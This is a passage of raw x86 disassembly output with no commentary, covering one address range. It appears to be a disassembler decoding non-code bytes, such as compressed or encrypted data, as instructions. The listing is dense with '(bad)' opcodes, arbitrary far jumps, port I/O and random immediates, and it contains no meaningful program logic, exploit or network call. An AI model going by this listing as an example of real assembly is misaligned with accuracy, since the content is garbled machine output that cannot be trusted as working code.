  42af22:	jp     0x42af9c
  42af24:	xchg   edi,eax
  42af25:	fild   DWORD PTR ss:[edx+edi*1+0x79521581]
  42af2d:	mov    al,0x26
  42af2f:	xlat   BYTE PTR ds:[ebx]
  42af30:	aas    
  42af31:	xchg   ebx,eax
  42af32:	pop    esp
  42af33:	fcomp  QWORD PTR [eax+eax*1+0x0]
	...
  42af93:	add    BYTE PTR [eax],al
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp-0x303e6616],0x3
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    bh,al
  42afaf:	xchg   DWORD PTR [ebx+0x19],esi
  42afb2:	dec    esp
  42afb3:	jo     0x42af42
  42afb5:	mov    esp,ebx
  42afb7:	xor    cl,0x93
  42afba:	pop    es
  42afbb:	cmp    eax,0x97d973e
  42afc0:	loope  0x42b019
  42afc2:	addr16 leave 
  42afc4:	xlat   BYTE PTR ds:[ebx]
  42afc5:	mov    bl,0x44
  42afc7:	pop    ds
  42afc8:	imul   ebx,DWORD PTR [esi+0x7b],0x90c6515
  42afcf:	pop    ebx
  42afd0:	stc    
  42afd1:	jo     0x42b038
  42afd3:	mov    edx,0x5f3fe74d
  42afd8:	pop    ecx
  42afd9:	jl     0x42afec
  42afdb:	mov    eax,ds:0xa8417ff
  42afe0:	adc    al,ch
  42afe2:	retf   0x118e
  42afe5:	adc    dl,dh
  42afe7:	pop    edx
  42afe8:	adc    bh,dh
  42afea:	imul   BYTE PTR [edi+0x31]
  42afed:	push   ebx
  42afee:	icebp  
  42afef:	ins    BYTE PTR es:[edi],dx
  42aff0:	push   ebp
  42aff1:	or     bh,BYTE PTR [edi]
  42aff3:	mov    ecx,DWORD PTR [esi+0x78]
  42aff6:	sahf   
  42aff7:	dec    esp
  42aff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aff9:	inc    ebx
  42affa:	mov    dl,0x18
  42affc:	mov    WORD PTR [eax],ds
  42affe:	js     0x42af99
  42b000:	xchg   DWORD PTR [edx+0x62be8757],esp
  42b006:	into   
  42b007:	std    
  42b008:	push   cs
  42b009:	dec    esi
  42b00a:	cdq    
  42b00b:	enter  0x5d70,0x6b
  42b00f:	adc    DWORD PTR [eax+0x53],ecx
  42b012:	mov    cl,0xfa
  42b014:	inc    ebx
  42b015:	add    ah,BYTE PTR [ebp+edi*1-0x2e641127]
  42b01c:	loopne 0x42b01d
  42b01e:	xchg   ebx,eax
  42b01f:	jne    0x42b02b
  42b021:	and    al,0x60
  42b023:	inc    ebp
  42b024:	adc    DWORD PTR [ebp-0x29],ecx
  42b027:	xor    DWORD PTR [edx+0x10],esi
  42b02a:	cmp    ebx,0xf8ee743a
  42b030:	jmp    0x532e5c9b
  42b035:	jo     0x42affd
  42b037:	cmc    
  42b038:	mov    eax,0x492d3411
  42b03d:	dec    eax
  42b03e:	ins    BYTE PTR es:[edi],dx
  42b03f:	jecxz  0x42b043
  42b041:	or     ecx,esi
  42b043:	test   al,0x1a
  42b045:	lock push ecx
  42b047:	dec    ecx
  42b048:	mov    bh,BYTE PTR [esi-0x6]
  42b04b:	xchg   ecx,eax
  42b04c:	iret   
  42b04d:	mov    dh,0x96
  42b04f:	mov    eax,0xe19dc864
  42b054:	dec    ecx
  42b055:	pop    ecx
  42b056:	daa    
  42b057:	jnp    0x42b036
  42b059:	jg     0x42b043
  42b05b:	test   BYTE PTR [ebp+edi*4+0x6b],0x92
  42b060:	adc    cl,BYTE PTR [eax-0x42]
  42b063:	mov    ds:0x8216d692,al
  42b068:	out    0x8c,eax
  42b06a:	mov    ds:0xaf623c44,eax
  42b06f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b070:	fsub   st(2),st
  42b072:	lahf   
  42b073:	stc    
  42b074:	jg     0x42b0d9
  42b076:	xchg   edx,eax
  42b077:	mov    esi,0xa23ff781
  42b07c:	and    eax,ecx
  42b07e:	mov    ss,WORD PTR [edi]
  42b080:	ret    0xc7b1
  42b083:	mov    edi,0xb533d70c
  42b088:	out    0x3,al
  42b08a:	push   ecx
  42b08b:	ins    DWORD PTR es:[edi],dx
  42b08c:	ficom  DWORD PTR [ebp+0xcfd5fd7]
  42b092:	pop    DWORD PTR [esi]
  42b094:	sbb    al,0x8
  42b096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b097:	and    DWORD PTR ds:0xe3af660a,edi
  42b09d:	jae    0x42b0d9
  42b09f:	arpl   WORD PTR [edi+0x12],ax
  42b0a2:	jge    0x42b035
  42b0a4:	cmp    DWORD PTR [ebx-0x5904bd64],eax
  42b0aa:	fidivr WORD PTR [edi]
  42b0ac:	lock jns 0x42b0c5
  42b0af:	call   0xf58b3ac2
  42b0b4:	add    DWORD PTR [eax],0x0
	...
  42b116:	jne    0x42b13d
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi-0x386d7f53]
  42b124:	add    eax,0x1ccae4f
  42b129:	add    BYTE PTR [edi],al
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [edx+0x4e],al
  42b130:	retf   
  42b131:	xchg   edi,eax
  42b132:	iret   
  42b133:	pusha  
  42b134:	out    dx,al
  42b135:	sbb    al,0x9e
  42b137:	mov    BYTE PTR [edi+esi*4+0x4e],cl
  42b13b:	icebp  
  42b13c:	push   ds
  42b13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b13e:	mov    cl,0x39
  42b140:	or     BYTE PTR [ebx],ch
  42b142:	stos   BYTE PTR es:[edi],al
  42b143:	clc    
  42b144:	aad    0xd4
  42b146:	fs pop edx
  42b148:	dec    ebp
  42b149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b14a:	jge    0x42b17f
  42b14c:	mov    BYTE PTR [ebx+0x4f],cl
  42b14f:	or     ecx,DWORD PTR [edx-0xd960d45]
  42b155:	or     DWORD PTR [ebx+0x38f61207],ecx
  42b15b:	mov    DWORD PTR [eax+0x64],0x34473c4d
  42b162:	or     DWORD PTR [eax+ecx*8-0x3a34fe8e],esp
  42b169:	lds    esp,FWORD PTR [eax]
  42b16b:	cmp    eax,0xe71a9d63
  42b170:	push   ebp
  42b171:	mov    ch,0x86
  42b173:	jno    0x42b1be
  42b175:	mov    ch,0xa7
  42b177:	test   DWORD PTR [edx+0xe712c09],esi
  42b17d:	xchg   ah,ch
  42b17f:	lods   eax,DWORD PTR ds:[esi]
  42b180:	add    edi,DWORD PTR [esi+0x19]
  42b183:	frstor cs:[esi]
  42b186:	dec    eax
  42b187:	cmp    esp,esi
  42b189:	fadd   DWORD PTR [eax-0x23e5b217]
  42b18f:	cmpps  xmm1,XMMWORD PTR [eax+0x1a],0x45
  42b194:	push   es
  42b195:	vandnpd xmm4,xmm2,xmm2
  42b199:	stos   BYTE PTR es:[edi],al
  42b19a:	loope  0x42b203
  42b19c:	xor    eax,0xc80b126b
  42b1a1:	xor    eax,edi
  42b1a3:	mov    bl,0xba
  42b1a5:	pop    ecx
  42b1a6:	xor    al,0x90
  42b1a8:	jg     0x42b18d
  42b1aa:	mov    DWORD PTR [edi+0x70],ecx
  42b1ad:	sbb    BYTE PTR [edi+ebx*1],ch
  42b1b0:	jmp    0x7359:0xade7739b
  42b1b7:	or     BYTE PTR ds:0x350c9252,ah
  42b1bd:	mov    edx,0x2410220a
  42b1c2:	mov    edi,0xe3cd7a01
  42b1c7:	xor    dh,ah
  42b1c9:	aam    0xc1
  42b1cb:	sbb    BYTE PTR [ebp+esi*2-0x6ec9bbcb],0x21
  42b1d3:	out    0xe3,al
  42b1d5:	jle    0x42b190
  42b1d7:	hlt    
  42b1d8:	mov    esi,DWORD PTR [edx+ecx*1-0x1f]
  42b1dc:	loopne 0x42b22c
  42b1de:	xlat   BYTE PTR ds:[ebx]
  42b1df:	and    cl,BYTE PTR [edx-0x3b]
  42b1e2:	je     0x42b1a2
  42b1e4:	and    BYTE PTR ss:[ebx-0x18],dh
  42b1e8:	ds out 0xbc,eax
  42b1eb:	retf   
  42b1ec:	sub    bh,BYTE PTR [esi-0x1b]
  42b1ef:	out    dx,eax
  42b1f0:	mov    WORD PTR [ebp-0x5431d13e],es
  42b1f6:	nop
  42b1f7:	xchg   ebx,eax
  42b1f8:	pop    edi
  42b1f9:	lock push ebp
  42b1fb:	sub    eax,0x571494b7
  42b200:	fbstp  TBYTE PTR [ebx]
  42b202:	inc    edx
  42b203:	loope  0x42b1be
  42b205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b206:	fistp  DWORD PTR [ebx]
  42b208:	and    DWORD PTR [ecx-0x2b],eax
  42b20b:	stc    
  42b20c:	lock fidiv WORD PTR [edi]
  42b20f:	inc    esi
  42b210:	test   DWORD PTR [edx+0x14dc0d3b],0xec53bd90
  42b21a:	sbb    edx,DWORD PTR [ebp-0x13]
  42b21d:	repnz inc edi
  42b21f:	call   0x3ae1c0a8
  42b224:	xor    al,0xc0
  42b226:	popa   
  42b227:	push   ss
  42b228:	ret    0xdd06
  42b22b:	popa   
  42b22c:	fwait
  42b22d:	(bad)  
  42b22e:	pop    edx
  42b22f:	inc    ecx
  42b230:	jmp    0x0:0x40828064
	...
  42b293:	add    BYTE PTR [eax],al
  42b295:	add    BYTE PTR [ebp-0x449f6672],ah
  42b29b:	ja     0x42b29a
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp-0x45],ch
  42b2a3:	mov    esp,edx
  42b2a5:	cdq    
  42b2a6:	mov    ch,0xcd
  42b2a8:	add    DWORD PTR [eax],eax
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [ecx+0x56d79b2c],ah
  42b2b3:	jne    0x42b2ea
  42b2b5:	enter  0x68c7,0xc6
  42b2b9:	cs je  0x42b327
  42b2bc:	mov    ebp,es
  42b2be:	jmp    0x42b281
  42b2c0:	dec    ebx
  42b2c1:	xchg   edx,eax
  42b2c2:	scas   eax,DWORD PTR es:[edi]
  42b2c3:	push   ecx
  42b2c4:	(bad)  
  42b2c5:	fstp   TBYTE PTR [esi+esi*4-0x35]
  42b2c9:	jo     0x42b347
  42b2cb:	xacquire xchg DWORD PTR [edx],esp
  42b2ce:	push   0xffffffda
  42b2d0:	lea    esi,[esi+0x9]
  42b2d3:	inc    esi
  42b2d4:	popa   
  42b2d5:	dec    ebp
  42b2d6:	xlat   BYTE PTR ds:[ebx]
  42b2d7:	shr    DWORD PTR [ecx-0x51df384e],0x73
  42b2de:	cmp    BYTE PTR [ebx-0x2f],ah
  42b2e1:	sub    eax,0x134bcf62
  42b2e6:	aaa    
  42b2e7:	nop
  42b2e8:	aaa    
  42b2e9:	cmp    eax,0x9ec74c3c
  42b2ee:	ja     0x42b2a2
  42b2f0:	and    ch,BYTE PTR [ebp+0x25e931ba]
  42b2f6:	js     0x42b31e
  42b2f8:	pop    es
  42b2f9:	adc    esi,ebp
  42b2fb:	loopne 0x42b35c
  42b2fd:	aas    
  42b2fe:	imul   edx,DWORD PTR [edi],0xd3cc323d
  42b304:	arpl   WORD PTR ss:[ebx+edi*8+0xe],sp
  42b309:	nop
  42b30a:	in     eax,dx
  42b30b:	test   eax,0xd00af6f2
  42b310:	es jae 0x42b2cb
  42b313:	jmp    0x42b378
  42b315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b316:	ss jg  0x42b2ff
  42b319:	retf   
  42b31a:	add    bh,bl
  42b31c:	jno    0x42b2e8
  42b31e:	cld    
  42b31f:	out    0x1d,al
  42b321:	or     eax,0x535dfd01
  42b326:	xchg   ebp,eax
  42b327:	xchg   esi,eax
  42b328:	hlt    
  42b329:	(bad)  
  42b32a:	lods   eax,DWORD PTR ds:[esi]
  42b32b:	sti    
  42b32c:	cmp    ch,ah
  42b32e:	ret    
  42b32f:	jae    0x42b399
  42b331:	sbb    eax,0x7285e796
  42b336:	jg     0x42b309
  42b338:	inc    edi
  42b339:	scas   al,BYTE PTR es:[edi]
  42b33a:	out    dx,al
  42b33b:	jmp    0xcc9b:0x867af661
  42b342:	fldcw  WORD PTR [esi+0x231bd9bd]
  42b348:	aam    0x24
  42b34a:	mov    dh,0x8e
  42b34c:	nop
  42b34d:	out    0xda,eax
  42b34f:	je     0x42b39d
  42b351:	cdq    
  42b352:	test   DWORD PTR [esi+0x14],edi
  42b355:	push   esp
  42b356:	enter  0x3a07,0x7c
  42b35a:	lods   al,BYTE PTR ds:[esi]
  42b35b:	push   ecx
  42b35c:	sub    eax,0xf68afb37
  42b361:	push   edx
  42b362:	sbb    eax,0x78517ecf
  42b367:	mov    ch,0x3b
  42b369:	push   ds
  42b36a:	ret    0x1772
  42b36d:	cmp    dl,bh
  42b36f:	adc    al,0x2c
  42b371:	jbe    0x42b317
  42b373:	das    
  42b374:	sbb    esi,DWORD PTR ds:0xede8e4cb
  42b37a:	rcr    ebp,cl
  42b37c:	mov    ebx,0x446fb5a6
  42b381:	push   cs
  42b382:	add    eax,0x71984e98
  42b387:	dec    edx
  42b388:	xchg   esp,eax
  42b389:	jb     0x42b40a
  42b38b:	retf   0x50e3
  42b38e:	inc    esp
  42b38f:	cld    
  42b390:	or     al,0x88
  42b392:	xor    edx,ecx
  42b394:	pop    ss
  42b395:	xchg   esi,eax
  42b396:	ficom  DWORD PTR [eax]
  42b398:	sub    DWORD PTR [esp+eax*2],0x5b
  42b39c:	cld    
  42b39d:	mov    edx,0x5ea78f94
  42b3a2:	cs adc al,0x9
  42b3a5:	inc    edx
  42b3a6:	adc    dh,0xdd
  42b3a9:	(bad)  
  42b3ab:	das    
  42b3ac:	in     eax,dx
  42b3ad:	jnp    0x42b3bd
  42b3af:	into   
  42b3b0:	leave  
  42b3b1:	repz cmp al,BYTE PTR [ebx]
  42b3b4:	ins    DWORD PTR es:[edi],dx
	...
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0xc3
  42b423:	xchg   edx,eax
  42b424:	and    DWORD PTR [edx-0x44],0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [eax+0x30],bh
  42b430:	sub    al,0xd9
  42b432:	out    0x4a,eax
  42b434:	xchg   edx,eax
  42b435:	push   esi
  42b436:	mov    eax,ds:0xe4a9cbcc
  42b43b:	inc    esi
  42b43c:	mov    ebx,edx
  42b43e:	call   0x97287c16
  42b443:	mov    ds:0xb161f83f,al
  42b448:	xchg   ebx,eax
  42b449:	repz xchg ebp,eax
  42b44b:	mov    ds:0x1daa5c11,eax
  42b450:	mov    BYTE PTR [eax-0x75224c83],ah
  42b456:	out    dx,eax
  42b457:	jle    0x42b403
  42b459:	in     al,dx
  42b45a:	fisttp QWORD PTR [ebp+0x2f]
  42b45d:	xchg   ebx,eax
  42b45e:	mov    dh,BYTE PTR [ebp+0x33]
  42b461:	inc    eax
  42b462:	jmp    0x42b3fe
  42b464:	pop    edx
  42b465:	stc    
  42b466:	and    BYTE PTR [ecx-0x44],0x42
  42b46a:	jno    0x42b45e
  42b46c:	pop    esp
  42b46d:	test   eax,0x6bdece65
  42b472:	nop
  42b473:	(bad)  
  42b474:	and    dh,BYTE PTR [esi-0x146fd816]
  42b47a:	test   al,0x8a
  42b47c:	jns    0x42b40b
  42b47e:	cmc    
  42b47f:	cmp    DWORD PTR [eax+0x67c90a51],ebp
  42b485:	retf   0xbfad
  42b488:	add    BYTE PTR [eax],0xf2
  42b48b:	sbb    eax,0x52f1453b
  42b490:	pop    esp
  42b491:	and    al,0x76
  42b493:	arpl   WORD PTR [esi+0x557cb4fc],dx
  42b499:	sbb    BYTE PTR [eax+0x7b6a7d0c],dh
  42b49f:	mov    dl,ah
  42b4a1:	or     DWORD PTR [ebx-0x7b16d8b6],eax
  42b4a7:	xchg   BYTE PTR [ebx+0x40ab51c7],cl
  42b4ad:	js     0x42b4b9
  42b4af:	in     eax,dx
  42b4b0:	sahf   
  42b4b1:	pusha  
  42b4b2:	into   
  42b4b3:	jmp    0xa9a76640
  42b4b8:	sbb    al,0x9a
  42b4ba:	sbb    DWORD PTR [esi],esp
  42b4bc:	ret    0x234e
  42b4bf:	(bad)
  42b4c3:	(bad)
  42b4c6:	leave  
  42b4c7:	or     cl,BYTE PTR [ebx+0x1e942daf]
  42b4cd:	sbb    DWORD PTR [ecx-0x17],eax
  42b4d0:	sbb    ebx,DWORD PTR [edi-0x28]
  42b4d3:	pop    ebx
  42b4d4:	mov    esi,ecx
  42b4d6:	jne    0x42b4ea
  42b4d8:	outs   dx,DWORD PTR ds:[esi]
  42b4d9:	shl    BYTE PTR [edx-0x5e],0x22
  42b4dd:	and    ch,BYTE PTR [edx+0x2aa05cc6]
  42b4e3:	cmp    al,0x8c
  42b4e5:	add    ch,ah
  42b4e7:	jne    0x42b51e
  42b4e9:	stos   DWORD PTR es:[edi],eax
  42b4ea:	stos   DWORD PTR es:[edi],eax
  42b4eb:	mov    esp,0xb1eeb67e
  42b4f0:	adc    dh,BYTE PTR [ebp+0x1b]
  42b4f3:	out    dx,eax
  42b4f4:	out    0x18,eax
  42b4f6:	scas   al,BYTE PTR es:[edi]
  42b4f7:	sbb    al,0xb8
  42b4f9:	mov    al,0x67
  42b4fb:	repnz cmp al,0x57
  42b4fe:	adc    esi,DWORD PTR [ebp-0x636d8668]
  42b504:	retf   0xd03a
  42b507:	xlat   BYTE PTR ds:[ebx]
  42b508:	rol    eax,0x7c
  42b50b:	xchg   edi,eax
  42b50c:	xor    edx,edx
  42b50e:	mov    ebp,0x2547d837
  42b513:	inc    esp
  42b514:	push   esi
  42b515:	xchg   esp,eax
  42b516:	ja     0x42b528
  42b518:	xchg   ecx,eax
  42b519:	pop    ecx
  42b51a:	leave  
  42b51b:	ins    DWORD PTR es:[edi],dx
  42b51c:	or     eax,0x31d13aeb
  42b521:	imul   eax,DWORD PTR [eax-0x7170b30b],0x7a
  42b528:	sbb    DWORD PTR [edx-0x60],eax
  42b52b:	or     al,0xa8
  42b52d:	out    0x83,eax
  42b52f:	sbb    al,0x9e
  42b531:	pop    edi
  42b532:	xchg   esp,eax
  42b533:	jle    0x42b4cf
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	arpl   WORD PTR [ebx-0x303ce471],sp
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [eax-0x17],dl
  42b5b0:	dec    esi
  42b5b1:	add    ebp,ebp
  42b5b3:	dec    ebx
  42b5b4:	inc    edi
  42b5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5b6:	sub    ch,cl
  42b5b8:	(bad)  
  42b5b9:	in     al,dx
  42b5ba:	push   eax
  42b5bb:	dec    esp
  42b5bc:	or     al,BYTE PTR [edi-0x15fbad06]
  42b5c2:	into   
  42b5c3:	xor    eax,0xffdf7171
  42b5c8:	push   esi
  42b5c9:	mov    edx,0x41cc37de
  42b5ce:	popa   
  42b5cf:	(bad)  
  42b5d0:	and    BYTE PTR [ebx],ah
  42b5d2:	mov    DWORD PTR [edx],ebx
  42b5d4:	or     ch,BYTE PTR [esi]
  42b5d6:	jae    0x42b566
  42b5d8:	xor    esi,DWORD PTR [esi+edi*1+0x2bf06146]
  42b5df:	jno    0x42b5fe
  42b5e1:	stos   BYTE PTR es:[edi],al
  42b5e2:	mov    al,0x4d
  42b5e4:	mov    al,ds:0x9b55f5db
  42b5e9:	icebp  
  42b5ea:	xchg   edi,eax
  42b5eb:	cli    
  42b5ec:	xor    DWORD PTR [ecx-0x2e],edx
  42b5ef:	fisttp DWORD PTR [eax+0x18910c3d]
  42b5f5:	pop    eax
  42b5f6:	cdq    
  42b5f7:	or     edi,ecx
  42b5f9:	xlat   BYTE PTR ds:[ebx]
  42b5fa:	mov    dl,0x52
  42b5fc:	lahf   
  42b5fd:	mov    ebp,0x347726b2
  42b602:	xor    cl,BYTE PTR [edi]
  42b604:	shl    BYTE PTR [eax],0xaa
  42b607:	sub    eax,0x25768349
  42b60c:	arpl   WORD PTR [ebp+eiz*2-0x3fa92925],cx
  42b613:	and    BYTE PTR [ebp-0x23],0x5c
  42b617:	cli    
  42b618:	and    BYTE PTR [esi-0x51],dh
  42b61b:	sub    eax,edx
  42b61d:	sub    esp,esi
  42b61f:	aas    
  42b620:	test   DWORD PTR [ebx-0x3c6af3f9],edx
  42b626:	out    0xac,eax
  42b628:	scas   eax,DWORD PTR es:[edi]
  42b629:	pop    edx
  42b62a:	jp     0x42b620
  42b62c:	and    al,0x40
  42b62e:	test   DWORD PTR [eax],esp
  42b630:	mov    ah,0x6
  42b632:	iret   
  42b633:	lods   al,BYTE PTR ds:[esi]
  42b634:	popf   
  42b635:	sub    bh,BYTE PTR [edx-0x26]
  42b638:	add    al,BYTE PTR [ebx-0x73]
  42b63b:	gs mov dh,0x8a
  42b63e:	pop    edi
  42b63f:	arpl   WORD PTR [ebx],sp
  42b641:	pop    eax
  42b642:	inc    edx
  42b643:	dec    ebp
  42b644:	sbb    al,0xcd
  42b646:	mov    WORD PTR [ecx-0x1b204615],ss
  42b64c:	mov    ebx,0x3a3ddea
  42b651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b652:	push   edi
  42b653:	jb     0x42b6c7
  42b655:	xchg   esi,eax
  42b656:	add    ecx,0x7c
  42b659:	mov    ds:0xa04c6faf,eax
  42b65e:	inc    ebx
  42b65f:	fwait
  42b660:	les    edi,FWORD PTR [esi+0x72d83403]
  42b666:	fs mov ch,0x7
  42b669:	cmc    
  42b66a:	cmp    BYTE PTR [edi-0x3d],0xb9
  42b66e:	jg     0x42b643
  42b670:	and    DWORD PTR [esp+eiz*4-0x1f],esi
  42b674:	push   0x7a
  42b676:	test   eax,0xdd1f0f10
  42b67b:	adc    eax,0x9d2833da
  42b680:	fiadd  WORD PTR [ebp-0x4bfe6c1d]
  42b686:	mov    ch,0x46
  42b688:	push   0xe0f867dd
  42b68d:	vxorps xmm1,xmm0,XMMWORD PTR [ebx+0x2cc9014c]
  42b695:	sub    al,0xff
  42b697:	fidivr DWORD PTR [edi+0x1c]
  42b69a:	bound  ebx,QWORD PTR [ecx-0x1eaf8772]
  42b6a0:	les    esi,FWORD PTR [ebx-0x60]
  42b6a3:	data16 int3 
  42b6a5:	xchg   ebx,eax
  42b6a6:	pop    ebx
  42b6a7:	xor    edx,edi
  42b6a9:	fld    QWORD PTR [ebx+0x6c2b5ae0]
  42b6af:	and    DWORD PTR [ebp+ecx*4+0x54c55d],ebx
	...
  42b716:	dec    esi
  42b717:	inc    edx
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp+0x44],bl
  42b723:	shl    DWORD PTR [edi],0xf6
  42b726:	retf   0x1d0
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    bl,dh
  42b72f:	or     bl,BYTE PTR [edi+ecx*8]
  42b732:	pushf  
  42b733:	std    
  42b734:	adc    BYTE PTR [edx-0x5a4046a3],al
  42b73a:	retf   
  42b73b:	arpl   WORD PTR [ecx+0xe],cx
  42b73e:	sbb    edx,DWORD PTR [edx+0x2e33bf33]
  42b744:	push   esp
  42b745:	mov    eax,0x9ab9660a
  42b74a:	sti    
  42b74b:	lods   al,BYTE PTR ds:[esi]
  42b74c:	add    eax,DWORD PTR [ecx-0x60]
  42b74f:	es pop esp
  42b751:	int3   
  42b752:	sbb    eax,0x882aea06
  42b757:	dec    esi
  42b758:	out    dx,al
  42b759:	arpl   WORD PTR [esi+0x25f70d4],bp
  42b75f:	add    al,0x1a
  42b761:	retf   
  42b762:	jmp    0x42b70d
  42b764:	lods   al,BYTE PTR ds:[esi]
  42b765:	xchg   ecx,eax
  42b766:	je     0x42b78b
  42b768:	mov    esi,0xec7081e3
  42b76d:	mov    ds:0x7a0131fc,eax
  42b772:	jne    0x42b71f
  42b774:	mov    al,ds:0x64d49c63
  42b779:	inc    esi
  42b77a:	or     BYTE PTR [ebx+0x4b],ch
  42b77d:	ss push edi
  42b77f:	cmp    esi,DWORD PTR [esi-0x2c761d81]
  42b785:	in     eax,dx
  42b786:	scas   al,BYTE PTR es:[edi]
  42b787:	xor    al,0xa3
  42b789:	inc    edi
  42b78a:	rcr    DWORD PTR [ebx],cl
  42b78c:	inc    esi
  42b78d:	or     DWORD PTR [esi],0xdd2a2f7c
  42b793:	sub    bh,dl
  42b795:	leave  
  42b796:	pop    eax
  42b797:	pop    ebx
  42b798:	(bad)  
  42b799:	mov    dl,0x43
  42b79b:	or     BYTE PTR [ebp-0x55e20b90],dl
  42b7a1:	imul   edi,DWORD PTR [esi-0x38],0x95b4277
  42b7a8:	es scas al,BYTE PTR es:[edi]
  42b7aa:	cld    
  42b7ab:	jmp    FWORD PTR [esi-0x25]
  42b7ae:	xchg   edi,eax
  42b7af:	mov    esp,0xf72f12e9
  42b7b4:	pop    ds
  42b7b5:	aaa    
  42b7b6:	xor    ebp,esp
  42b7b8:	imul   edi,DWORD PTR [eax],0x5b
  42b7bb:	adc    DWORD PTR [edx],edi
  42b7bd:	push   ss
  42b7be:	push   edi
  42b7bf:	(bad)  
  42b7c0:	mov    al,ds:0x7b7a73c5
  42b7c5:	adc    dl,ch
  42b7c7:	cmp    DWORD PTR [edx],0xffffffcc
  42b7ca:	sar    DWORD PTR [eax+0x2620ae69],cl
  42b7d0:	adc    edx,esp
  42b7d2:	test   al,0x20
  42b7d4:	js     0x42b7bf
  42b7d6:	lds    edx,FWORD PTR [esi+0x2e3f568b]
  42b7dc:	mov    esi,0x3f916b83
  42b7e1:	aad    0x44
  42b7e3:	outs   dx,DWORD PTR ds:[esi]
  42b7e4:	jmp    0xb3e7:0x6a7694be
  42b7eb:	push   eax
  42b7ec:	jmp    0x9664:0x6bf57824
  42b7f3:	jbe    0x42b7f2
  42b7f5:	call   FWORD PTR [esi+esi*1-0x3e]
  42b7f9:	and    BYTE PTR [ebx+ebp*1],bh
  42b7fc:	popf   
  42b7fd:	mov    ah,BYTE PTR cs:[ebp+0x57]
  42b801:	mov    esp,0x396a0896
  42b806:	enter  0x2bee,0x49
  42b80a:	and    BYTE PTR [edi+ebp*2+0x2b],cl
  42b80e:	jge    0x42b87a
  42b810:	aam    0x85
  42b812:	mov    dh,0x1e
  42b814:	pop    edx
  42b815:	dec    ebx
  42b816:	xchg   edi,eax
  42b817:	xchg   esi,eax
  42b818:	adc    DWORD PTR [edx],ebp
  42b81a:	sbb    dl,BYTE PTR [edx+edi*8]
  42b81d:	or     BYTE PTR [ebx-0x21bccfb],bh
  42b823:	adc    ebx,ebp
  42b825:	and    ch,bl
  42b827:	pop    es
  42b828:	xchg   ebx,eax
  42b829:	push   0xffffff95
  42b82b:	lock mov ecx,0x1f7c56ba
  42b831:	int    0x67
  42b833:	cdq    
  42b834:	cli    
	...
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0x20d12cda]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [edx],bl
  42b8af:	enter  0x4fdf,0x51
  42b8b3:	sub    eax,0x5b3c6a4f
  42b8b8:	loope  0x42b844
  42b8ba:	out    dx,al
  42b8bb:	les    edi,FWORD PTR [ebx+0x150e6eb1]
  42b8c1:	xchg   ebp,eax
  42b8c2:	xchg   ecx,eax
  42b8c3:	xor    al,0xd1
  42b8c6:	push   ds
  42b8c7:	(bad)  
  42b8c8:	clc    
  42b8c9:	aaa    
  42b8ca:	(bad)  
  42b8cb:	pop    edi
  42b8cc:	rcr    bl,1
  42b8ce:	ins    DWORD PTR es:[edi],dx
  42b8cf:	in     al,dx
  42b8d0:	push   esi
  42b8d1:	mov    ecx,0x4b0aa80f
  42b8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8d7:	clc    
  42b8d8:	loopne 0x42b863
  42b8da:	cmc    
  42b8db:	mov    dh,0x27
  42b8dd:	iret   
  42b8de:	add    ecx,esp
  42b8e0:	inc    edi
  42b8e1:	dec    esp
  42b8e2:	(bad)  
  42b8e3:	out    dx,eax
  42b8e4:	jns    0x42b933
  42b8e6:	fcomp  QWORD PTR [eax-0x179ffe28]
  42b8ec:	xchg   ecx,eax
  42b8ed:	aam    0x7b
  42b8ef:	pop    eax
  42b8f0:	ret    
  42b8f1:	and    esi,DWORD PTR [ebx+0x1f]
  42b8f4:	xor    BYTE PTR [eax+0x2eba117e],cl
  42b8fa:	xor    al,0x50
  42b8fc:	lods   al,BYTE PTR ds:[esi]
  42b8fd:	jmp    0x5a5fdd08
  42b902:	shl    dl,0x0
  42b905:	mov    dl,bl
  42b907:	nop
